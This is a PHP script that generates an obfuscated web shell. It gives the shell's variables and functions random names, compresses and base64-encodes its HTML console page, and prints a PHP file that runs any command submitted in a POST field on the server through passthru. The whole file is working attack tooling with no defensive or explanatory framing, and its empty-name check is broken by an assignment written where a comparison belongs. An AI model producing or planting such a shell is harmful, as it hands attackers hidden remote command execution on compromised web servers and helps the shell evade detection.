<?php
//; exit 1      # in case you did ./rand.php

// are we running from a webserver or terminal?
if ( ! isset($_SERVER['TERM'])){
    header('Content-Type: text/plain');
}


function make_random_name(){
    // making some randomness
    $name = rand() * rand();
    $name = hash("whirlpool", $name);
    $name = crypt($name, rand());

    // shorten, rm leading numbers
    $name = preg_replace('~([\.\$/]|.{16}$)~', '', $name);
    $name = preg_replace('/^[0-9]+/', '', $name);

    // make sure the regex didn't leave us an empty string
    return ($name = NULL? make_random_name(): $name);
}

$eval_function    = make_random_name();
$eval_arg         = make_random_name();
$html_console_tag = make_random_name();
$post             = make_random_name();
$post_command     = make_random_name();
$script_name      = make_random_name();
$page_html        = make_random_name();
$page_html_var    = make_random_name();

$page_html = <<< EOF
<html>
    <head>
        <style>
            input{ background-color: rgb(255, 255, 255); width: 100%;}
            * { font-size: 12px; color: rgb(0, 0, 0); font-family: monospace !important;}
            body{ background-color: rgb(250, 250, 250);}
            $html_console_tag{ color: rgb(170, 170, 170);}
        </style>
    </head>
    <body>
        <form action="$script_name" id="form" method="POST">
            <input type="text" name="$post" autocomplete="off" autofocus>
            <span> 2&gt;&amp;1 </span><button type="submit">\$\$\$</button>
        </form>
    <code>
<pre>
EOF;

$page_html = base64_encode(gzdeflate($page_html));

$shell = sprintf('<?php
$%s = gzinflate(base64_decode("%s"));

function %s($%s){
    echo "<%s>$ ".$%s."</%s><br>";
    echo htmlentities(passthru($%s." 2>&1"), ENT_IGNORE);
}
@$%s=$_POST["%s"];
echo preg_replace("/%s/", basename($_SERVER["SCRIPT_NAME"]), $%s);

if (isset($%s)){
    %s($%s);
}
else {
    %s("#");
}
__halt_compiler/*
*/();',
$page_html_var, $page_html, $eval_function, $eval_arg, $html_console_tag, $eval_arg, $html_console_tag, 
$eval_arg, $post_command, $post, $script_name, $page_html_var, $post_command, $eval_function, 
$post_command, $eval_function);

echo $shell;

?>